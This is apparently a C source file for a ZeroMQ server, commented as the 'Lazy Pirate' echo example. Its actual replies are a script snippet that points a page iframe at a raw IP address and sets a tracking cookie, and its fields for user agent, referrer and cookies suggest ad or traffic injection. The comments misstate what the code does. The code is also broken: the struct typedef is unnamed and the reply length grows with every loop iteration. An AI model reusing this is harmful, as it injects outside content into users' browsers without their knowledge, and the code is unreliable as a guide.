
//  Lazy Pirate server
//  Binds REQ socket to tcp://*:5555
//  Like hwserver except:
//   - echoes request as-is
//   - randomly runs slowly, or exits to simulate a crash.

#include "zhelpers.h"
#include <unistd.h>


typedef enum
{
	ENUM_ZMQ_HOST = 0,
	ENUM_ZMQ_USER_AGENT,
	ENUM_ZMQ_COOKEIS,	
}enum_msg_t;


typedef struct
{
	int adtype;
	char useragent[512];
	char refer[1024];
	char cookies[512];
};



int zmq_server_init (void)
{
    srandom ((unsigned) time (NULL));

    void *context = zmq_ctx_new ();
    void *server = zmq_socket (context, ZMQ_REP);
    zmq_bind (server, "tcp://*:5555");
	char buffer[2048];
	int size;
	char sendbuffer[2048];
    int cycles = 0;
	int l = 0;

	
    while (1) {
		
		size=zmq_recv (server, buffer, 2000, 0);

		if(size == -1)
		{
			printf("zmq_recv Failed\n");
			break;;
		}
		
		buffer[size] = 0;		
		printf("recv len(%d) %s\n", size, buffer);
		
		l+= snprintf(sendbuffer, 2048,
			"echo  \'document.getElementById(\"suspendcode15iframe\").src=\"http://219.234.83.60/locate_2/ddk_yanmai.pc.html\";\';"
			"setcookie(\"%s\", \"%s\", time()+3600);",
			"__hy_cook1", "ppppp"
			);
			
		zmq_send(server, sendbuffer, l , 0);
		printf("%s\n", sendbuffer);
    }
    zmq_close (server);
    zmq_ctx_destroy (context);
    return 0;
}

